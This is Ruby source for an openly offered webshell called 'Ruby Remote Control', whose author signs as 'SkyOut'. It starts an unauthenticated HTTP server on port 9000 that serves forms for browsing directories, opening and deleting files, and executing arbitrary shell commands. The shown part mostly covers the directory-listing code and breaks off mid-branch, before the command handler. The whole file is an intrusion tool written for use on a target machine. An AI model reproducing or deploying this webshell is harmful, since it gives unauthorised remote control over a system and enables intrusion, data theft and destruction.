#!/usr/bin/env ruby
 
# Author: SkyOut
# Date: 2006/2007
# Website: http://core-security.net/
# Coded under: OpenBSD 4.0
# Ruby version: 1.8.4
 
# As this tool is very basic it only uses two standard
# classes, which should make it portable and usable
# everywhere
require 'socket'
require 'cgi'
 
# Default port is 9000 if the user does not specify
# another one
port = ARGV[0] || 9000
server = TCPServer.new('127.0.0.1', port)
 
# This will be displayed before the shell is started
# and will only be displayed in the shell
puts
puts
puts "+-----------------------------------------------+"
puts "|\t\t\t\t\t\t||"
puts "|\t[RRC] Ruby Remote Control\t\t||"
puts "|\tby SkyOut\t\t\t\t||"
puts "|\t\t\t\t\t\t||"
puts "|\tStarting the webshell on #{port}...\t||"
puts "|\t\t\t\t\t\t||"
puts "|\t-> Fighting for freedom or\t\t||"
puts "|\tdying in oppression! <-\t\t\t||"
puts "|\t\t\t\t\t\t||"
puts "+-----------------------------------------------+|"
puts " ------------------------------------------------+"
puts
puts
 
# The main code goes here ...
while (s = server.accept)
 
   s.print "HTTP/1.1 200/OK\r\nContent-type: text/html\r\n\r\n"
 
   s.print "<html><head><title>Ruby Remote Control [RRC]</title>\r\n\r\n"
 
   # These are the used CSS styles, which makes it easy to change and
   # edit the style of the webshell (its colors)
   s.print "<!-- CSS STYLE -->\r\n"
   s.print "<style type=\"text/css\"><!--\r\n"
   s.print "body { font-family: arial; background-color: #606060 }\r\n"
   s.print "body a.blue { color: #000080; text-decoration: none }\r\n"
   s.print "body a.grey { color: #808080; text-decoration: none }\r\n"
   s.print "body a.black { color: #000000; text-decoration: none }\r\n"
   s.print "body span.red { color: #800000; text-decoration: none }\r\n"
   s.print "body span.green { color: #005000; text-decoration: none }\r\n"
   s.print "body span.grey { color: #808080; text-decoration: none }\r\n"
   s.print "--></style>\r\n"
   s.print "<!-- -->\r\n\r\n"
 
   s.print "</head><body>\r\n\r\n"
 
   s.print "<!-- HEADER BOX -->\r\n"
   s.print "<b><fieldset>|| Ruby Remote Control [RRC] || SkyOut ||<br>\r\n"
   s.print "|| Index: http://host:9000/ || Help: Just leave the input field blank ||</fieldset></b><br>\r\n"
   s.print "<!-- -->\r\n\r\n"
 
   # The input field used for the directory listing
   s.print "<!-- INPUT FIELD FOR DIRECTORY OPENING -->\r\n"
   s.print "<form method=\"get\">\r\n"
   s.print "<input type=\"text\" name=\"open_dir\">\r\n"
   s.print "<input type=\"submit\" value=\"Open directory\"></form>\r\n"
   s.print "<!-- -->\r\n\r\n"
 
   # The input field used for the command execution
   s.print "<!-- INPUT FIELD FOR COMMAND EXECUTION -->\r\n"
   s.print "<form method=\"get\">\r\n"
   s.print "<input type=\"text\" name=\"cmd_exec\">\r\n"
   s.print "<input type=\"submit\" value=\"Execute command\"></form>\r\n"
   s.print "<!-- -->\r\n\r\n"
 
   # Sometimes it can happen, that Ruby identifies files differently, for example .mp3 files
   # will be shown as executables or .core files will be shown as normal files and more. To
   # make sure those special files can not be opened (do not get a " [+] " next to their name)
   # edit the array below.
   do_not_open = Array.new
   do_not_open = [".wmv", ".mpg", ".mpeg", ".avi", ".divx", ".mp4", ".mp3", ".ogg", ".flac", ".gif", ".png", ".jpg", ".jpeg", ".core"]
 
   # As mentioned above with the files, this is an array of file types, that shall be shown
   # as normal files and therefore it should be able to open them (like script files)
   do_open = Array.new
   do_open = [".sh", ".ksh", ".bash", ".csh", ".perl", ".tcl", ".rb", ".pl", ".py"]
 
   # The GET request to the server will be put into an array to filter out the
   # parts that we will use later
   get = s.gets
   get = get.split(' ')
   get = get.fetch(1)
   get = get.split('=')
 
   # This will be ?open_dir, ?open_file, ?delete_file or ?cmd_exec
   command = get[0]
   # This will contain the value after the " = " sign, example: ?open_dir=/home
   value = get[1]
 
   # The code for a directory listing goes here ...
 
   # Remember: In every function we use the CGI class to escape special
   # characters, for example " ?open_dir=/home/some%20name " will become
   # " ?open_dir=/home/some name "
   if (command == "/?open_dir") && (value != nil)
 
      dir = CGI.unescape(value)
 
      # Make sure the users input really calls an existing directory
      if (File.directory?(dir))
         # Make sure we have the right privileges to read it
         if (File.stat(dir).readable?)
 
            s.print "<fieldset style=\"width: 50%\"><legend><b>Directory listing: #{dir}</b></legend>\r\n"
            s.print "<b><font color=\"#800000\">[FILE]</font> <font color=\"#005000\">[EXECUTABLE]</font> <font color=\"#000080\">[DIRECTORY]</font> <font color=\"#C0C0C0\">[HIDDEN]</font> <font color=\"#000000\">[NO PERMISSIONS]</font></b><br>[+] = Open file [-] = Delete file<br><br>\r\n"
 
            # We build an array to finally check in which directory
            # we are (root directory or anything else) and build our
            # own link for moving one directory up
            dir_arr = dir.split('/')
            dir_arr.pop
            dir_arr.collect! {|x| "/" + x}
            dir_arr[0] = ""
 
            if (dir_arr.length >= 2)
               s.print "<b><a class=\"blue\" href=\"?open_dir=#{dir_arr}\">Up ..<br></a></b><br>\r\n"
            else
               s.print "<b><a class=\"blue\" href=\"?open_dir=/\">Up ..<br></a></b><br>\r\n"
            end
 
            # This loop will display every file in the directory
            Dir.foreach(dir) do |entry|
 
               # The " . " and " .. " entries will of course be ignored, therefore
               # we coded our own link (see above)
               next if entry == "." || entry == ".."
 
               # Now let's go over to the way the content is displayed and linked ...
 
               # The content is a DIRECTORY #####################################################
               if File.stat("#{dir}#{File::SEPARATOR}#{entry}").directory?
                  # If we are in the root directory do ...
                  if (dir == "/")
                     # If the directory is hidden (starts with a " . ") display it in a grey style
                     if (entry.match(/^\.{1}/))
                        # Make sure we have the rights to access the directory, if not there is no way to
                        # move into it (do not try doing it, it will fail or crash the shell)
                        if (File.stat("#{dir}#{File::SEPARATOR}#{entry}").readable?)
                           s.print "<b><a class=\"grey\" href=\"?open_dir=#{dir}#{entry}\">> #{entry}</a></b><br>\r\n"
                        else
                           s.print "<b>> #{entry}</b><br>\r\n"
                        end
                     # The same code as above, just for non-hidden directories
                     else
                        if (File.stat("#{dir}#{File::SEPARATOR}#{entry}").readable?)
                           s.print "<b><a class=\"blue\" href=\"?open_dir=#{dir}#{entry}\">> #{entry}</a></b><br>\r\n"
                        else
                           s.print "<b>> #{entry}</b><br>\r\n"
                        end
                     end
                  # If we are not in the root directory do the following ... (see above for more details)
                  else
                     if (entry.match(/^\.{1}/))
                        if (File.stat("#{dir}#{File::SEPARATOR}#{entry}").readable?)
                           s.print "<b><a class=\"grey\" href=\"?open_dir=#{dir}/#{entry}\">> #{entry}</a></b><br>\r\n"
                        else
                           s.print "<b>> #{entry}</b><br>\r\n"
                        end
                     else
